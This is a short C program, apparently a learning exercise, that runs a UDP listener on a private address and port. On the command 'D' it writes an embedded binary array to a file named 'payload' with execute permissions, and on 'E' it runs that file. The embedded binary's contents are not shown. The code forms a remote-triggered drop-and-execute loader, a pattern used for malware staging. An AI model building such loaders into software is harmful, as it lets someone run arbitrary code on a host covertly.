#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <wait.h>
#include <fcntl.h> // for open 


//// Pre-Compile Area /////
#include "helloworld.h" //// this includes the binary array and its length/ essentiall just a C file






void deploy(void);
int main(void){
	 

	

	const char *ip = "10.60.117.165";
	int port = 5000;

	int sockfd;
	struct sockaddr_in server_addr, client_addr;
	char buffer[1024];
	socklen_t addr_size;
	int n;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
	perror("[-]socket error");
	exit(1);
	}

	memset(&server_addr, '\0', sizeof(server_addr)); /// clears the server _adddr stucture 
	server_addr.sin_family = AF_INET; //// Makes IPV4
	server_addr.sin_port = htons(port); ///sets the port number
	server_addr.sin_addr.s_addr = inet_addr(ip); /// converts ip address to computer numbers 

	n = bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)); //// attaches the address and port to the socket dile despcriptor
	if (n < 0){ //// if binding fails
	perror("[-]bind error");
	exit(1);
	}

	bzero(buffer, 1024);
	addr_size = sizeof(client_addr);


	//////////////// Payload file processing ////////////////////////////////////////





	
		while(1) /// server loop always runs 
		{ /// recvfrom is the UDP protocol listening 
			bzero(buffer, 1024);
			recvfrom(sockfd, buffer, 1024, 0, (struct sockaddr*)&client_addr, &addr_size); //// waits for information
			printf("[+]Data recv: %s\n", buffer); /// stores the clients IP // sockect file descrip- pointer to buffer, max size of buffer, control flags
            

			//// recvfrom receives the buffer as a bytes
			
			buffer[strcspn(buffer, "\n")] = '\0'; /// searches for newline character and replaces with terminator 

            if(strcmp(buffer,"D") == 0){ //// compares ASC11 values of buffer to a string, if 0 its equal
                printf("Loading\n"); /// Sender uses fgets()
				deploy();
				
            }

			if(strcmp(buffer,"E") == 0){ //// compares ASC11 values of buffer to a string, if 0 its equal
                printf("Executing...\n"); /// Sender uses fgets()
				char *args[] = {"./payload", NULL}; /// makes const 
				int result = execv(args[0], args); ///E
            }
			
			

		}



	
return 0;
}

void deploy(void){

		int fd = open("payload", O_WRONLY | O_CREAT, 0700);
		if(write(fd, helloworld, helloworld_len) == -1){//// helloworld binary 
			printf("Payload failed");
		}
		close(fd);
	}

